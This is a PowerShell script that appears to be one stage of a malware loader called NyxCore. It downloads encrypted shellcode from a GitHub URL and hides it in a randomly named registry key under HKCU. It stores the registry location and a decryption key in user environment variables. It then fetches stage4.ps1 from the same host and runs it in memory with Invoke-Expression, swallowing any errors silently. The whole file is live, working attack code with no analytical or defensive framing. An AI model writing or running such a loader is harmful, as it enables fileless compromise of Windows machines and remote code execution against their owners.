$junkUrl = "https://raw.githubusercontent.com/h41th3m0x/NyxCore/refs/heads/main/encrypted_shellcode_junk.dat"
$junkContent = [System.Text.Encoding]::UTF8.GetString((New-Object Net.WebClient).DownloadData($junkUrl))

# Create random registry path and name
$regPath = "HKCU:\Software\" + (-join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_}))
$regName = (-join ((65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object {[char]$_}))

# Create registry path
$null = [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey($regPath.Replace("HKCU:\", ""))

# Save junk content to registry
Set-ItemProperty -Path $regPath -Name $regName -Value $junkContent -Force

# Set environment variables for final stage
[Environment]::SetEnvironmentVariable("NYXCOR_SHELLCODE_REG_PATH", $regPath, "User")
[Environment]::SetEnvironmentVariable("NYXCOR_SHELLCODE_REG_NAME", $regName, "User")
[Environment]::SetEnvironmentVariable("NYXCOR_SHELLCODE_KEY", "NyXc0r_4dv4nc3d_M4lw4r3_2025_", "User")

# Download and execute stage4.ps1 in memory
$stage4Url = "https://raw.githubusercontent.com/h41th3m0x/NyxCore/refs/heads/main/stage4.ps1"
try {
    $stage4Script = (New-Object Net.WebClient).DownloadString($stage4Url)
    Invoke-Expression $stage4Script
}
catch {
    # Silent fail
}